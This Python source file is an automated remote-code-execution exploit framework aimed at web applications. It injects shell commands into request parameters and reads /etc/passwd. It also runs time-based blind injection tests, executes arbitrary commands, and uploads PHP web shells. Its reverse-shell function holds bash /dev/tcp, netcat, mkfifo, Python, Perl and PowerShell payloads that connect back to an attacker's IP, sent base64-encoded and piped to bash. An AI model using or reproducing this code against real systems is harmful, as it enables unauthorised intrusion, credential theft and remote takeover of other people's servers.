"""
Remote Code Execution (RCE) Exploit Module
Automated exploitation of command injection and RCE vulnerabilities
"""

import requests
import time
import base64
import urllib.parse
from typing import Dict, List, Optional, Any
from urllib.parse import urljoin, urlparse


class RCEExploit:
    """
    Automated Remote Code Execution exploitation framework
    Supports command injection, deserialization, and various RCE techniques
    """

    def __init__(self, target_url: str, timeout: int = 15, delay: float = 0.5):
        """
        Initialize RCE exploit

        Args:
            target_url: Target URL
            timeout: Request timeout
            delay: Delay between requests
        """
        self.target_url = target_url
        self.timeout = timeout
        self.delay = delay
        self.session = requests.Session()
        self.successful_payloads = []
        self.command_outputs = []

    def test_command_injection(
        self, parameter: str, test_commands: Optional[List[str]] = None
    ) -> Dict[str, Any]:
        """
        Test for command injection vulnerabilities

        Args:
            parameter: Parameter to test
            test_commands: Custom test commands

        Returns:
            Test results
        """
        print(f"[*] Testing command injection on parameter: {parameter}")

        if not test_commands:
            test_commands = self._get_command_injection_payloads()

        results = {
            "vulnerable": False,
            "successful_payloads": [],
            "command_outputs": [],
            "os_detected": None,
        }

        for payload in test_commands:
            response = self._send_payload(parameter, payload)

            if response and self._check_command_execution(response, payload):
                print(f"[+] Command injection confirmed with payload: {payload}")
                results["vulnerable"] = True
                results["successful_payloads"].append(payload)

                # Detect OS
                if not results["os_detected"]:
                    results["os_detected"] = self._detect_os(response)

                # Capture output
                output = self._extract_command_output(response, payload)
                if output:
                    results["command_outputs"].append(
                        {"payload": payload, "output": output}
                    )
                    print(f"[+] Command output captured: {output[:100]}...")

                self.successful_payloads.append(
                    {
                        "parameter": parameter,
                        "payload": payload,
                        "type": "command_injection",
                    }
                )

            time.sleep(self.delay)

        return results

    def test_blind_command_injection(
        self, parameter: str, delay_seconds: int = 5
    ) -> Dict[str, Any]:
        """
        Test for blind command injection using time delays

        Args:
            parameter: Parameter to test
            delay_seconds: Delay time for time-based detection

        Returns:
            Test results
        """
        print(f"[*] Testing blind command injection (time-based)...")

        # Time-based payloads
        time_payloads = {
            "linux": [
                f"; sleep {delay_seconds}",
                f"| sleep {delay_seconds}",
                f"& sleep {delay_seconds}",
                f"`sleep {delay_seconds}`",
                f"$(sleep {delay_seconds})",
            ],
            "windows": [
                f"& timeout /t {delay_seconds}",
                f"| ping -n {delay_seconds} 127.0.0.1",
                f"& ping -n {delay_seconds} 127.0.0.1",
            ],
        }

        results = {"vulnerable": False, "successful_payloads": [], "os_detected": None}

        # Test Linux payloads
        for payload in time_payloads["linux"]:
            start_time = time.time()
            response = self._send_payload(parameter, payload)
            elapsed_time = time.time() - start_time

            if elapsed_time >= (delay_seconds - 1):  # Allow 1 second margin
                print(f"[+] Blind command injection confirmed (Linux)!")
                print(f"    Payload: {payload}")
                print(f"    Delay: {elapsed_time:.2f}s")

                results["vulnerable"] = True
                results["os_detected"] = "linux"
                results["successful_payloads"].append(payload)

                self.successful_payloads.append(
                    {
                        "parameter": parameter,
                        "payload": payload,
                        "type": "blind_command_injection",
                        "os": "linux",
                    }
                )
                break

            time.sleep(self.delay)

        # Test Windows payloads if Linux failed
        if not results["vulnerable"]:
            for payload in time_payloads["windows"]:
                start_time = time.time()
                response = self._send_payload(parameter, payload)
                elapsed_time = time.time() - start_time

                if elapsed_time >= (delay_seconds - 1):
                    print(f"[+] Blind command injection confirmed (Windows)!")
                    print(f"    Payload: {payload}")
                    print(f"    Delay: {elapsed_time:.2f}s")

                    results["vulnerable"] = True
                    results["os_detected"] = "windows"
                    results["successful_payloads"].append(payload)

                    self.successful_payloads.append(
                        {
                            "parameter": parameter,
                            "payload": payload,
                            "type": "blind_command_injection",
                            "os": "windows",
                        }
                    )
                    break

                time.sleep(self.delay)

        return results

    def execute_command(
        self, parameter: str, command: str, working_payload: str
    ) -> Optional[str]:
        """
        Execute arbitrary command using confirmed RCE

        Args:
            parameter: Vulnerable parameter
            command: Command to execute
            working_payload: Known working payload template

        Returns:
            Command output or None
        """
        print(f"[*] Executing command: {command}")

        # Build payload based on template
        if ";" in working_payload:
            payload = f"; {command}"
        elif "|" in working_payload:
            payload = f"| {command}"
        elif "&" in working_payload:
            payload = f"& {command}"
        elif "`" in working_payload:
            payload = f"`{command}`"
        elif "$(" in working_payload:
            payload = f"$({command})"
        else:
            payload = command

        response = self._send_payload(parameter, payload)

        if response:
            output = self._extract_command_output(response, payload)
            if output:
                print(f"[+] Command executed successfully")
                print(f"[+] Output:\n{output}")

                self.command_outputs.append({"command": command, "output": output})

                return output

        print("[-] Command execution failed or no output received")
        return None

    def establish_reverse_shell(
        self,
        parameter: str,
        attacker_ip: str,
        attacker_port: int,
        os_type: str = "linux",
    ) -> Dict[str, Any]:
        """
        Attempt to establish reverse shell

        Args:
            parameter: Vulnerable parameter
            attacker_ip: Attacker's IP address
            attacker_port: Attacker's listening port
            os_type: Target OS (linux/windows)

        Returns:
            Reverse shell attempt results
        """
        print(f"[*] Attempting reverse shell to {attacker_ip}:{attacker_port}")

        results = {
            "payload_sent": False,
            "shell_payload": None,
            "listener_command": None,
        }

        if os_type == "linux":
            # Bash reverse shell payloads
            shell_payloads = [
                f"bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1",
                f"nc -e /bin/bash {attacker_ip} {attacker_port}",
                f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {attacker_ip} {attacker_port} >/tmp/f",
                f'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{attacker_ip}",{attacker_port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])\'',
                f'perl -e \'use Socket;$i="{attacker_ip}";$p={attacker_port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");}};\'',
            ]

            results["listener_command"] = f"nc -lvnp {attacker_port}"

        else:  # Windows
            shell_payloads = [
                f"powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{attacker_ip}',{attacker_port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\"",
            ]

            results["listener_command"] = f"nc -lvnp {attacker_port}"

        # Try each payload
        for shell_payload in shell_payloads:
            print(f"[*] Trying reverse shell payload: {shell_payload[:80]}...")

            # Encode payload if needed
            encoded_payload = base64.b64encode(shell_payload.encode()).decode()

            # Send payload
            try:
                injection_payload = f"; echo {encoded_payload} | base64 -d | bash"
                response = self._send_payload(parameter, injection_payload)

                results["payload_sent"] = True
                results["shell_payload"] = shell_payload

                print(f"[+] Reverse shell payload sent!")
                print(f"[!] Start listener with: {results['listener_command']}")
                break

            except Exception as e:
                print(f"[-] Payload failed: {str(e)}")
                continue

        return results

    def test_file_upload_rce(
        self, upload_url: str, shell_content: str, shell_filename: str = "shell.php"
    ) -> Dict[str, Any]:
        """
        Test RCE via malicious file upload

        Args:
            upload_url: File upload endpoint
            shell_content: Web shell code
            shell_filename: Name for uploaded shell

        Returns:
            Upload test results
        """
        print(f"[*] Testing file upload RCE...")

        results = {"vulnerable": False, "shell_uploaded": False, "shell_url": None}

        try:
            # Prepare file
            files = {"file": (shell_filename, shell_content, "application/x-php")}

            # Upload shell
            response = self.session.post(
                upload_url, files=files, timeout=self.timeout, verify=False
            )

            if response.status_code == 200:
                print("[+] File uploaded successfully")
                results["shell_uploaded"] = True

                # Try to determine shell URL
                # Common upload directories
                upload_dirs = [
                    "/uploads/",
                    "/files/",
                    "/user_uploads/",
                    "/media/",
                    "/assets/",
                ]

                base_url = (
                    f"{urlparse(upload_url).scheme}://{urlparse(upload_url).netloc}"
                )

                for upload_dir in upload_dirs:
                    shell_url = base_url + upload_dir + shell_filename

                    # Test if shell is accessible
                    test_response = self.session.get(
                        shell_url, timeout=self.timeout, verify=False
                    )

                    if test_response.status_code == 200:
                        print(f"[+] Shell accessible at: {shell_url}")
                        results["vulnerable"] = True
                        results["shell_url"] = shell_url
                        break

        except Exception as e:
            print(f"[!] File upload test error: {str(e)}")

        return results

    def test_deserialization_rce(
        self, parameter: str, language: str = "php"
    ) -> Dict[str, Any]:
        """
        Test for insecure deserialization leading to RCE

        Args:
            parameter: Parameter to test
            language: Target language (php, java, python)

        Returns:
            Test results
        """
        print(f"[*] Testing {language} deserialization RCE...")

        results = {"vulnerable": False, "language": language, "payloads_tested": []}

        if language == "php":
            # PHP deserialization payloads
            # Simple object injection
            payloads = [
                'O:8:"stdClass":1:{s:4:"test";s:5:"value";}',
                # Add more sophisticated payloads here
            ]

        elif language == "java":
            # Java deserialization (VERY dangerous)
            payloads = [
                # Placeholder - real Java deser payloads are complex
            ]

        elif language == "python":
            # Python pickle deserialization
            payloads = [
                # Pickle payloads
            ]

        else:
            print(f"[!] Language '{language}' not supported")
            return results

        for payload in payloads:
            response = self._send_payload(parameter, payload)
            results["payloads_tested"].append(payload)

            if response and self._check_deserialization_success(response):
                print(f"[+] Deserialization vulnerability detected!")
                results["vulnerable"] = True
                break

            time.sleep(self.delay)

        return results

    def _get_command_injection_payloads(self) -> List[str]:
        """Get default command injection payloads"""
        return [
            # Linux/Unix
            "; id",
            "| id",
            "& id",
            "; whoami",
            "| whoami",
            "& whoami",
            "; uname -a",
            "| uname -a",
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "`id`",
            "$(id)",
            "`whoami`",
            "$(whoami)",
            # Windows
            "& whoami",
            "| whoami",
            "& ipconfig",
            "| ipconfig",
            "& dir",
            "| dir",
            # Both
            "; ls",
            "| ls",
            "& ls",
            "; pwd",
            "| pwd",
        ]

    def _send_payload(
        self, parameter: str, payload: str
    ) -> Optional[requests.Response]:
        """Send RCE payload"""
        try:
            parsed = urlparse(self.target_url)

            if parsed.query:
                # GET parameter
                from urllib.parse import parse_qs, urlencode

                params = parse_qs(parsed.query)
                params[parameter] = [payload]

                new_query = urlencode(params, doseq=True)
                url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"

                response = self.session.get(url, timeout=self.timeout, verify=False)
            else:
                # POST parameter
                data = {parameter: payload}
                response = self.session.post(
                    self.target_url, data=data, timeout=self.timeout, verify=False
                )

            return response

        except Exception as e:
            print(f"[!] Request error: {str(e)}")
            return None

    def _check_command_execution(
        self, response: requests.Response, payload: str
    ) -> bool:
        """Check if command was executed"""
        text = response.text.lower()

        # Look for command output indicators
        indicators = {
            "id": ["uid=", "gid=", "groups="],
            "whoami": ["root", "www-data", "apache", "nginx", "administrator"],
            "uname": ["linux", "darwin", "unix"],
            "passwd": ["root:x:", "/bin/bash", "/bin/sh"],
            "ipconfig": ["windows", "adapter", "ipv4"],
            "dir": ["directory of", "volume in drive"],
        }

        for cmd, patterns in indicators.items():
            if cmd in payload.lower():
                if any(pattern in text for pattern in patterns):
                    return True

        return False

    def _detect_os(self, response: requests.Response) -> Optional[str]:
        """Detect target OS from response"""
        text = response.text.lower()

        if any(
            indicator in text
            for indicator in ["uid=", "gid=", "/bin/", "/usr/", "linux"]
        ):
            return "linux"
        elif any(indicator in text for indicator in ["windows", "c:\\", "cmd.exe"]):
            return "windows"

        return None

    def _extract_command_output(
        self, response: requests.Response, payload: str
    ) -> Optional[str]:
        """Extract command output from response"""
        # This is simplified - real extraction depends on response format
        text = response.text

        # Try to find output between common delimiters
        if "uid=" in text:
            # Extract id command output
            import re

            match = re.search(r"uid=\d+.*?gid=\d+.*?groups=\d+[^\n]*", text)
            if match:
                return match.group(0)

        # Return first 500 chars if indicators found
        if self._check_command_execution(response, payload):
            return text[:500]

        return None

    def _check_deserialization_success(self, response: requests.Response) -> bool:
        """Check if deserialization was successful"""
        # Look for PHP deserialization success indicators
        indicators = ["object", "__wakeup", "__destruct", "unserialize"]
        return any(ind in response.text.lower() for ind in indicators)

    def execute_full_exploitation(
        self,
        parameter: str,
        attacker_ip: Optional[str] = None,
        attacker_port: int = 4444,
    ) -> Dict[str, Any]:
        """
        Execute full RCE exploitation chain

        Args:
            parameter: Vulnerable parameter
            attacker_ip: Attacker IP for reverse shell (optional)
            attacker_port: Attacker port for reverse shell

        Returns:
            Complete exploitation results
        """
        print("=" * 60)
        print("REMOTE CODE EXECUTION EXPLOITATION")
        print("=" * 60)

        results = {
            "success": False,
            "rce_type": None,
            "os_detected": None,
            "command_outputs": [],
            "shell_established": False,
        }

        # Test command injection
        cmd_result = self.test_command_injection(parameter)

        if cmd_result["vulnerable"]:
            results["success"] = True
            results["rce_type"] = "command_injection"
            results["os_detected"] = cmd_result["os_detected"]
            results["command_outputs"] = cmd_result["command_outputs"]

            # Try to execute information gathering commands
            if cmd_result["successful_payloads"]:
                working_payload = cmd_result["successful_payloads"][0]

                # Execute recon commands
                recon_commands = ["whoami", "id", "pwd", "ls -la"]
                if results["os_detected"] == "windows":
                    recon_commands = ["whoami", "ipconfig", "dir"]

                print("[*] Executing reconnaissance commands...")
                for cmd in recon_commands:
                    output = self.execute_command(parameter, cmd, working_payload)
                    if output:
                        results["command_outputs"].append(
                            {"command": cmd, "output": output}
                        )

                # Attempt reverse shell if attacker IP provided
                if attacker_ip:
                    print(f"[*] Attempting reverse shell...")
                    shell_result = self.establish_reverse_shell(
                        parameter,
                        attacker_ip,
                        attacker_port,
                        results["os_detected"] or "linux",
                    )

                    if shell_result["payload_sent"]:
                        results["shell_established"] = True
                        results["shell_listener"] = shell_result["listener_command"]

        # Test blind command injection if regular failed
        if not results["success"]:
            blind_result = self.test_blind_command_injection(parameter)
            if blind_result["vulnerable"]:
                results["success"] = True
                results["rce_type"] = "blind_command_injection"
                results["os_detected"] = blind_result["os_detected"]

        print("=" * 60)
        print("EXPLOITATION COMPLETE")
        print(f"Success: {results['success']}")
        print(f"RCE Type: {results['rce_type']}")
        print(f"OS Detected: {results['os_detected']}")
        print(f"Commands Executed: {len(results['command_outputs'])}")
        print("=" * 60)

        return results

    def get_exploitation_summary(self) -> Dict[str, Any]:
        """Get summary of exploitation results"""
        return {
            "total_successful_payloads": len(self.successful_payloads),
            "successful_payloads": self.successful_payloads,
            "command_outputs": self.command_outputs,
        }
